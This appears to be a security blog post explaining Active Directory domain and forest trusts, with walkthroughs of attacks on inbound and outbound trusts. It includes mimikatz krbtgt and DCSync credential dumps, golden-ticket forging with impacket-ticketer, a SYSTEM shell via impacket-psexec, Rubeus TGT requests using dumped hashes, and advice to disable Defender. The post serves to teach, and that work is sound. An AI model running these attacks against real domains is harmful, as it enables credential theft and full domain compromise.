<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Domain &amp; Forest Trusts | Regex-33's blog</title><meta name="author" content="Youssef Achtatal"><meta name="copyright" content="Youssef Achtatal"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="I took inspiration from researching this topic from one of the recent machines that I wrote a writeup for, which you can find [here](https:&#x2F;&#x2F;regex-33.com&#x2F;writeups&#x2F;trusted&#x2F;) (you can probably get the i">
<meta property="og:type" content="article">
<meta property="og:title" content="Domain &amp; Forest Trusts">
<meta property="og:url" content="https://regex-33.me/2024/06/05/domain-trusts/index.html">
<meta property="og:site_name" content="Regex-33&#39;s blog">
<meta property="og:description" content="I took inspiration from researching this topic from one of the recent machines that I wrote a writeup for, which you can find [here](https:&#x2F;&#x2F;regex-33.com&#x2F;writeups&#x2F;trusted&#x2F;) (you can probably get the i">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://regex-33.me/images/research/domain-trusts/domain_trusts.png">
<meta property="article:published_time" content="2024-06-06T02:35:44.000Z">
<meta property="article:modified_time" content="2024-09-12T19:15:22.817Z">
<meta property="article:author" content="Youssef Achtatal">
<meta property="article:tag" content="research">
<meta property="article:tag" content="Active Directory">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://regex-33.me/images/research/domain-trusts/domain_trusts.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://regex-33.me/2024/06/05/domain-trusts/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Error',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: 'days',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"You have switched to Traditional Chinese","cht_to_chs":"You have switched to Simplified Chinese","day_to_night":"You have switched to Dark Mode","night_to_day":"You have switched to Light Mode","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: true,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Domain & Forest Trusts',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-09-12 15:15:22'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()
  window.addEventListener('load',() => { preloader.endLoading() })

  if (false) {
    document.addEventListener('pjax:send', () => { preloader.initLoading() })
    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
  }
})()</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/images/profile.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">7</div></a><a href="//"><div class="headline">Articles</div><div class="length-num">5</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/writeups/"><i class="fa-fw fas fa-folder-open"></i><span> Writeups</span></a></div><div class="menus_item"><a class="site-page" href="/categories/certifications/"><i class="fa-fw fas fa-folder-open"></i><span> certifications</span></a></div><div class="menus_item"><a class="site-page" href="/categories/research/"><i class="fa-fw fas fa-folder-open"></i><span> Research</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url('/images/cyberpunk-red.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Regex-33's blog"><span class="site-name">Regex-33's blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/writeups/"><i class="fa-fw fas fa-folder-open"></i><span> Writeups</span></a></div><div class="menus_item"><a class="site-page" href="/categories/certifications/"><i class="fa-fw fas fa-folder-open"></i><span> certifications</span></a></div><div class="menus_item"><a class="site-page" href="/categories/research/"><i class="fa-fw fas fa-folder-open"></i><span> Research</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Domain &amp; Forest Trusts</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-06-06T02:35:44.000Z" title="Created 2024-06-05 22:35:44">2024-06-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-09-12T19:15:22.817Z" title="Updated 2024-09-12 15:15:22">2024-09-12</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/research/">research</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Domain &amp; Forest Trusts"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>I took inspiration from researching this topic from one of the recent machines that I wrote a writeup for, which you can find <a target="_blank" rel="noopener" href="https://regex-33.com/writeups/trusted/">here</a> (you can probably get the interpretation from the name of the chain). The topic that I wanted to delve into today was the idea of Domain and Forest Trusts in an Active Directory environment. I tried getting a little creative with Lucidchart, as you’ll see in the images to follow.</p>
<p>I’ll list a few topics that you’ll need to understand before we delve into domain and forest trusts, as it just helps with practice to know what these mean.</p>
<ul>
<li><strong>Domain Objects</strong>: These are essentially exactly what they mean in the main - domain objects are any asset in a domain that serves a purpose. This can include users, services, machines, user properties; almost anything you can think of.</li>
<li><strong>KDC</strong>: The KDC (Key Distribution Center) is the architecture at the center of Kerberos. When a domain object is requesting access to a resource, the KDC will grant it either a TGT (for login) or a TGS (for login to a service).</li>
<li><strong>Domain Dominance</strong>: You’ll probably hear this come up a lot in this post, it’s essentially red-team terminology for compromising domains and using that domains privileges to compromise another (to however many domains is needed for the compromising procedure).</li>
<li><strong>SIDs</strong>: These are essentially principal names that give domain objects their level of authority. They are denoted as long strings of text that start with <code>S-1-5</code>, and can vary based on the domain object. (For example, an Administrator’s SID can be <code>S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX-500</code>, where <code>500</code> represents their privilege level.)</li>
<li><strong>Child&#x2F;Parent Domains</strong>: You’ll see me reference these two terms often. One domain is considered the parent domain (to which is allowed traffic towards the child domain) and the other is considered the child domain (to which the parent domain is allowing inbound traffic towards.)</li>
<li><strong>Bidirectional Trusts</strong>: (Also called two-way trusts) This stems off of Child&#x2F;Parent domains, in which both domains are considered the Parent and the Child. This is due to both domains trusting one another.</li>
<li><strong>Transitivity</strong>: This essentially is a chain of trusts amongst domains. If Domain&#x2F;Forest A trusts Domain&#x2F;Forest B, and Domain&#x2F;Forest B trusts Domain&#x2F;Forest C, then that means that A also trusts C. Dependent on the owner of the domains, there can be various other properties that belong to this chain of trusts.</li>
</ul>
<p>From a non-technical level, domain trusts are essentially rulesets that allows one domain to authenticate and access certain resources in a different domain. This essentially works by allowing the traffic for authentication to flow between both domains. This involves utilizing the KDC to authorize the domain object access to the specific domain in question.</p>
<p>These trusts can either be <code>one-way</code> or <code>bidirectional</code>. Dependent on which domain is the trusting domain and which domain is the trusted domain, these one-way trusts can be labelled as <code>Inbound</code> or <code>Outbound</code>. This of course is in relation to the trusted domain that is able to access the trusting domains resources.</p>
<p><img src="/images/research/domain-trusts/b.jpg"></p>
<p>If a trust is <code>bidirectional</code> then that means that both domains trust one another - and both domains can access the resources of one another.</p>
<p>For forests, this works essentially the same way. If Forest A trusts on another Forest B, then Forest B will be able to access resources on Forest A (but not the other way around if it is a one-way trust!).</p>
<p>To bounce off of the topic of <code>transitivity</code> as we discussed earlier, domains&#x2F;forests can be transitive or non-transitive. With a transitive entity, that same chain that I explained earlier (and in the image below) has transitivity enabled and multiple trusts can consist within that chain even if they aren’t directly related to one-another. However, if a domain trust is <code>non-transitive</code>, then this chain of trusts does not exist and each domain only has trust rights to the domain that they are delegated to.</p>
<p><img src="/images/research/domain-trusts/c.jpg"></p>
<p>The image above entails a transitive domain trust, meaning that despite Domain A having a trust only on Domain B, that also means that it has a trust on Domain C since Domain B has a trust on Domain C.</p>
<p>In most cases, attackers exploit domain trusts by utilizing Kerberos. You may have heard of Kerberos terms such as <code>Silver</code>, <code>Golden</code>, or even <code>Diamond</code> tickets. I’ll give a short outline to what we can do with these types of tickets, however I’d like to leave domain dominance to its own separate post at a later date.</p>
<ul>
<li><strong>Silver Tickets</strong>: A forged Kerberos service ticket that can be used to impersonate a computer account. These computer accounts are relative to services such as <code>MSSQL</code> or <code>IIS</code>.</li>
<li><strong>Golden Tickets</strong>: A forged Kerberos service ticket that can be used to impersonate any user within the confines of the machine within the domain.</li>
<li><strong>Diamond Tickets</strong>: Much similar to a golden ticket, except for the fact that the legitimate ticket that is issued is modified, and any TGS-REQs will have the relative AS-REQ before the request field.</li>
</ul>
<p>For our specific case below, we’ll be looking at different domain trusts and creating a <code>Golden</code> ticket for our study, as that’s all we’ll need. This can be leveraged by tools such as <code>mimikatz</code> or <code>Impacket</code>.</p>
<p>Note that the environments that you’ll see in the examples to follow are not real domains or environments to be awareness, and I do not own them in any capacity. I am merely providing these as examples as to what you might see in an environment.</p>
<h1 id="Domain-Trust-Enumeration"><a href="#Domain-Trust-Enumeration" class="headerlink" title="Domain Trust Enumeration"></a>Domain Trust Enumeration</h1><p>Generally speaking, one of the common methods I’ve found to enumerating a domain trust is by utilizing <code>PowerView</code>. From a red-team aspect, the <code>PowerView</code> module can be picked up by your standard anti-virus whether that be AVs such as Defender or McAfee. It’s essentially used to import modules into <code>PowerShell</code> that allow for further enumeration of domain objects in a domain, such as <code>groups</code>, <code>computers</code>, even <code>delegation</code> vulnerabilities.</p>
<p>I’ve referenced the GitHub repository where you can find the script <a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">here</a>. It’s a part of the larger <code>PowerSploit</code> module, which is used for broad pen-testing tasks and can helpful in a variety of situations. If you’re testing this locally, make sure to disable Windows Defender or create an exception for the <code>PowerView</code> script.</p>
<p>Note that these examples I will be providing assume that we already have control over a domain denoted as <code>regex-33.dev</code>. These </p>
<p>To enumerate domain trusts, we can use one of the modules present in <code>PowerSploit</code> to get the current domain trust present on the system we have access to.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Users\daz\Documents&gt; Import-Module .\PowerView.ps1</span><br><span class="line"></span><br><span class="line">PS C:\Users\daz\Documents&gt; Get-DomainTrust</span><br><span class="line"></span><br><span class="line">SourceName      : regex-33.dev</span><br><span class="line">TargetName      : regex-33.pro</span><br><span class="line">TrustType       : WINDOWS_ACTIVE_DIRECTORY</span><br><span class="line">TrustAttributes : </span><br><span class="line">TrustDirection  : Inbound</span><br><span class="line">WhenCreated     : 5/9/2024 6:25:43 PM</span><br><span class="line">WhenChanged     : 5/9/2024 6:38:25 PM</span><br></pre></td></tr></table></figure>

<p>Due to the trust being inbound, this indicates to us that we have the authorization to grant domain objects access to the target domain <code>regex-33.pro</code>. With this in mind, we can also begin to enumerate the domain through the trust using a different <code>PowerView</code> cmdlet.</p>
<p>Just as a helpful tip to remember how this works - <code>regex-33.dev</code> is the source of this trust, meaning that the trust direction is towards us. To reference this in a simpler sense, let says <code>regex-33.dev</code> is Domain A and <code>regex-33.pro</code> is Domain B. In our example, the trust direction is inbound from Domain B to Domain A, meaning (as Domain A) we have access to the resources in Domain B. Don’t get confused with the <code>Inbound</code> entry in the domain trust output, as that is relative to the TRUST, not the ACCESS.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Users\daz\Documents&gt; Get-DomainComputer -Domain regex-33.pro -Properties DnsHostName</span><br><span class="line"></span><br><span class="line">dnshostname</span><br><span class="line">-----------      </span><br><span class="line">dc.regex-33.pro</span><br><span class="line">finance.regex-33.pro</span><br><span class="line">db.regex-33.pro</span><br><span class="line">corp.regex-33.pro</span><br><span class="line">kiosk.regex-33.pro</span><br></pre></td></tr></table></figure>

<p>This now tells us every workstation that is present within the domain, along with their DNS name. The process from here is trivial, dependent on what you would need to compromise for your red teaming procedure. In some cases, we may want to get access to the low-level <code>kiosk</code>, and in others we may want to look at the domain controller denoted as <code>dc.regex-33.pro</code>.</p>
<p>From here your attack can vary based on the trust that is present between the two domains. I’ll go over all three different variants of these trusts and how to exploit them effectively.</p>
<h1 id="Exploiting-Inbound-Trusts"><a href="#Exploiting-Inbound-Trusts" class="headerlink" title="Exploiting Inbound Trusts"></a>Exploiting Inbound Trusts</h1><p>As a preliminary example, let’s assume that we’re utilizing the same trust from the last section. This means that <code>regex-33.dev</code> has a one-way inbound trust with the foreign domain <code>regex-33.pro</code>.</p>
<p>We can exploit this using a few Impacket tools which are present by default on the latest versions of Kali Linux, so we’ll use those to start. However we’ll need a few assets in order to do this:</p>
<ul>
<li>The <code>NTLM</code> hash of the <code>krbtgt</code> domain object on our current domain, <code>regex-33.dev</code>.</li>
<li>The <code>regex-33.dev</code> domain object SID.</li>
<li>The <code>regex-33.pro</code> domain object SID.</li>
</ul>
<p>As explained previously, the objects in our domain can be given access to any of the resources that are present in <code>regex-33.pro</code>. We can start by getting the assets above and by enumerating a few of the objects on the remote domain such as the <code>Enterprise Admins</code> foreign group.</p>
<p>To start, we can grab both the <code>NTLM</code> hash and the <code>regex-33.dev</code> domain SID by using <code>mimikatz</code> on the domain that we already control. If you haven’t used <code>mimikatz</code> before, it’s an extremely helpful tool used to dump domain information from registry in the post-exploitation phase of your red-teaming procedure. You can find the link to <code>mimikatz</code> in this GitHub repo <a target="_blank" rel="noopener" href="https://github.com/ParrotSec/mimikatz">here</a>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Users\daz\Documents&gt; .\mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::lsa /user:krbtgt /patch&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>

<p>This output from <code>mimikatz</code> should give us both the NTLM hash of the <code>krbtgt</code> user along with the domain SID, to which I’ll include in a list to prevent clutter.</p>
<ul>
<li><code>krbtgt</code> NTLM hash - <code>b84a08b41bd7e5e7f3708d0166d61bb1</code></li>
<li><code>DAZ - regex-33.dev</code> domain SID - <code>S-1-5-21-878395754-674829726-1647362892</code></li>
</ul>
<p>Next, we’ll use another <code>PowerView</code> cmdlet that allows us to view the <code>Enterprise Admins</code> group amongst the foreign domain and all it’s relative properties. The object that we’re looking at is the <code>MemberName</code> entry, which should contain the respective SID that we’re looking for.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Users\daz\Documents&gt; Get-DomainForeignGroupMember -Domain regex-33.pro</span><br><span class="line"></span><br><span class="line">GroupDomain             : regex-33.pro</span><br><span class="line">GroupName               : Enterprise Admins</span><br><span class="line">GroupDistinguishedName  : CN=Enterprise,CN=Admins,CN=Builtin,DC=daz,DC=pro</span><br><span class="line">MemberDomain            : regex-33.pro</span><br><span class="line">MemberName              : S-1-5-21-492758473-538291874-1904739281-519</span><br><span class="line">MemberDistinguishedName : CN=S-1-5-21-492758473-538291874-1904739281-519,CN=ForeignSecurityPrincipals,DC=daz,DC=pro</span><br></pre></td></tr></table></figure>

<p>Now that we have all the information, we can progress with our exploit.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">daz@daz$ impacket-ticketer -nthash b84a08b41bd7e5e7f3708d0166d61bb1 -domain-sid S-1-5-21-878395754-674829726-1647362892 -extra-sid S-1-5-21-492758473-538291874-1904739281-519 -domain (trusting_domain) Administrator</span><br></pre></td></tr></table></figure>

<p>This will create an <code>Administrator.ccache</code> file in the directory that we are currently present in. This is a credential cache, which holds the credentials of the Kerberos ticket that we just crafted. Since this is specifically a golden ticket we created, we can use this as our authentication point to access the other domain.</p>
<p>Since we’re using Kerberos authentication, we’ll also need to set the <code>KRB5CCNAME</code> global variable on Kali Linux to point to the <code>ccache</code> file we just created.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">daz@daz$ export KRB5CCNAME=Administrator.ccache</span><br></pre></td></tr></table></figure>

<p>Finally, we’ll need to run <code>PsExec</code> to establish a remote session to the workstation that we’d like to authenticate to. In our case, we’re looking to authenticate as the <code>Administrator</code> user using the full FQDN of the machine. Remember to add the IP addresses and all the domain names you’ll need in your <code>/etc/hosts</code> file.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">daz@daz$ impacket-psexec regex-33.dev/Administrator@dc.regex-33.pro -k -no-pass -target-ip (IP address of dc.regex-33.pro)</span><br></pre></td></tr></table></figure>

<p>And that should be all you’ll need. A remote shell session should be established through <code>PsExec</code>, which will do all the needful and open a reverse shell for you. From my experience, this creates a session as <code>SYSTEM</code>, which is the highest-authoritative account you have access to on a workstation. From here, we can dump all the hashes and pivot to other workstations if we need to - or potentially compromise another domain!</p>
<h1 id="Exploiting-Outbound-Trusts"><a href="#Exploiting-Outbound-Trusts" class="headerlink" title="Exploiting Outbound Trusts"></a>Exploiting Outbound Trusts</h1><p>Outbound trusts work a little different, as the traffic is flowing in a different direction. In the last example, <code>regex-33.dev</code> trusted <code>regex-33.pro</code>, however what if this was an outbound trust?</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Users\daz\Documents&gt; Import-Module .\PowerView.ps1</span><br><span class="line"></span><br><span class="line">PS C:\Users\daz\Documents&gt; Get-DomainTrust</span><br><span class="line"></span><br><span class="line">SourceName      : regex-33.dev</span><br><span class="line">TargetName      : regex-33.pro</span><br><span class="line">TrustType       : WINDOWS_ACTIVE_DIRECTORY</span><br><span class="line">TrustAttributes : </span><br><span class="line">TrustDirection  : Outbound</span><br><span class="line">WhenCreated     : 5/9/2024 9:46:13 PM</span><br><span class="line">WhenChanged     : 5/9/2024 9:52:58 PM</span><br></pre></td></tr></table></figure>

<p>Remember, now that this is an outbound trust, <code>regex-33.dev</code> is the domain that is trusting <code>regex-33.pro</code>. This means that <code>regex-33.pro</code> can access the resources on <code>regex-33.dev</code>. The issue with this, is that we are in control of the trusting domain in this case, and we shouldn’t be able to gain access to the trusted domain.</p>
<p>Despite this, there are still ways to exploit this. Within a domain trust, there is a shared password that is automatically set to expire once every 30 days). This password is stored within a TDO, or Trusted Domain Object. Our main point of exploitation is the TDO, as these are stored within the <code>SYSTEM</code> machine that we currently have access to.</p>
<p>We can dump the keys used for the TDO using <code>mimikatz</code> on the domain controller, however we’ll also need to find the GUID of the TDO which we currently have the ability to enumerate.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Users\daz\Documents&gt; Get-DomainObject -Identity &quot;CN=regex-33.pro,CN=System,DC=regex-33,DC=dev&quot; | Select ObjectGuid</span><br><span class="line"></span><br><span class="line">objectguid                          </span><br><span class="line">----------</span><br><span class="line">f5ksj19d-72rt-81lt-92d5-92jd27c109p2</span><br></pre></td></tr></table></figure>

<p>Now that we have the GUID, we can dump the TDO using <code>mimikatz</code> and by performing a <code>dcsync</code>. What a DCSync will do in our case is have <code>mimikatz</code> act like a domain controller and dump all the credentials that it has access to on the current domain. Since we are supplying the GUID of the TDO, we can dump the respect <code>AES256</code>, <code>AES128</code>, and <code>RC4</code> hashes to the TDO.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Users\daz\Documents&gt; .\mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:regex-33.dev /guid:&#123;f5ksj19d-72rt-81lt-92d5-92jd27c109p2&#125;&quot; &quot;exit&quot;</span><br><span class="line"></span><br><span class="line">[DC] &#x27;regex-33.dev&#x27; will be the domain</span><br><span class="line">[DC] &#x27;dc.regex-33.dev&#x27; will be the DC server</span><br><span class="line">[DC] Object with GUID &#x27;&#123;f5ksj19d-72rt-81lt-92d5-92jd27c109p2&#125;&#x27;</span><br><span class="line">[rpc] Service  : ldap</span><br><span class="line">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class="line"></span><br><span class="line">Object RDN           : regex-33.pro</span><br><span class="line"></span><br><span class="line">** TRUSTED DOMAIN - Antisocial **</span><br><span class="line"></span><br><span class="line">Partner              : regex-33.pro</span><br><span class="line"> [ Out ] REGEX-33.PRO -&gt; REGEX-33.DEV</span><br><span class="line">    * 5/9/2024 9:46:13 PM - CLEAR   - 58 0d 24 aa 1f f8 07 2c 2a d4 a8 cc 68 93 6e 20 5f ad 3b 32 e0 51 8e cc f0</span><br><span class="line">	* aes256_hmac       1. b48fcf2e5e6cf31e6ee73d35e1409aa0a903c44c514e024d6a2a30701ec6</span><br><span class="line">	* aes128_hmac       b48fcf2e5e6cf31e6ee73d35e1409aa0</span><br><span class="line">	* rc4_hmac_nt       e1087fb17c8e5b4f29c4e1c0cb161481</span><br><span class="line"></span><br><span class="line"> [Out-1] REGEX-33.PRO -&gt; REGEX-33.DEV</span><br><span class="line">    * 5/9/2024 9:46:13 PM - CLEAR   - 58 0d 24 aa 1f f8 07 2c 2a d4 a8 cc 68 93 6e 20 5f ad 3b 32 e0 51 8e cc f0</span><br><span class="line">	* aes256_hmac       b48fcf2e5e6cf31e6ee73d35e1409aa0a903c44c514e024d6a2a30701ec6</span><br><span class="line">	* aes128_hmac       b48fcf2e5e6cf31e6ee73d35e1409aa0</span><br><span class="line">	* rc4_hmac_nt       e1087fb17c8e5b4f29c4e1c0cb161481</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>In this output, we see two passwords in their <code>AES256</code>, <code>AES128</code>, <code>RC4</code> values. We’re focused on the primary <code>[Out]</code> key and not the <code>[Out-1]</code> key, however it isn’t an issue in our situation because it hasn’t been 30 days since the creation of this trust. If 30 days were to pass since this point, then the passwords for both <code>[Out]</code> and <code>[Out-1]</code> might be different.</p>
<p>What makes these types of hashes so dangerous to use is that we can use them for Pass-the-Hash methods into Kerberos for a multitude of different use cases. You’ll see that in the next part of the process, we’ll use it to impersonate a user and interact with the domain however we’d like.</p>
<p>That being said, we have the hash for the TDO, but what user does it belong to? In our scenario, there are users called “trust users”, which are essentially trusted accounts that have the ability to access resources over the domain trust. While the domain trust is outbound, the trusted domain still requires a trust user to use in order to properly access our domain’s resources. This same trust user is present on the trusted domain, which we now have a hash for. We can discover valid trust users with another <code>PowerView</code> cmdlet, you can find an example of what you might see below.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Users\daz\Documents&gt; Get-DomainUser -Identity * -Properties DisplayName, MemberOf | fl</span><br><span class="line"></span><br><span class="line">displayname : DAN</span><br><span class="line">memberof    : &#123;CN=Pro Users,CN=Users,DC=regex-33,DC=pro&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>You can also use tools such as <code>ADSearch --search &quot;(objectCategory=user)&quot;</code> to discover valid machine accounts. Just for simplicities sake, we’ll stick with <code>PowerView</code>.</li>
</ul>
<p>This essentially tells us that there could be a valid trust account named <code>DAN$</code> amongst the <code>regex-33.pro</code> domain.  Although we aren’t able to confirm this since we can’t access the any domain resources in the trusted domain, we can still attempt to try and determine if this is the right account. This is what makes this process semi-trivial, as we’re essentially guessing whether or not this is a valid trust account.</p>
<p>We can use a tool called <code>Rubeus</code> to create a valid service ticket for the <code>DAN$</code> account. Rubeus is toolset that is used for Kerberos interaction and exploits, and it will assist in us being able to create TGTs and TGSs that we’ll need in order to access the foreign domain.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Users\daz\Documents&gt; .\Rubeus.exe asktgt /user:DAN$ /domain:regex-33.pro /rc4:e1087fb17c8e5b4f29c4e1c0cb161481 /nowrap</span><br><span class="line"></span><br><span class="line">[*] Action: Ask TGT</span><br><span class="line"></span><br><span class="line">[*] Using rc4_hmac hash: e1087fb17c8e5b4f29c4e1c0cb161481</span><br><span class="line">[*] Building AS-REQ (w/ preauth) for: &#x27;regex-33.pro\DAN$&#x27;</span><br><span class="line">[*] Using domain controller: (DOMAIN CONTROLLER IP)</span><br><span class="line">[+] TGT request successful!</span><br><span class="line">[*] base64(ticket.kirbi):</span><br><span class="line"></span><br><span class="line">		doIHrK[...snip...]Yit98s</span><br></pre></td></tr></table></figure>

<p>This will return a TGT that we can now use on the remote domain, which can be used in a variety of situations. You can enumerate potential vectors with this TGT with tools such as <code>PowerSploit</code> or <code>ADSearch</code>. In some situations, we may be dealing with attacks such as constrained&#x2F;unconstrained delegation, Kerberoasting, ASREPRoasting, or even ADCS. I look forward to creating future posts regarding these exploits in the future.</p>
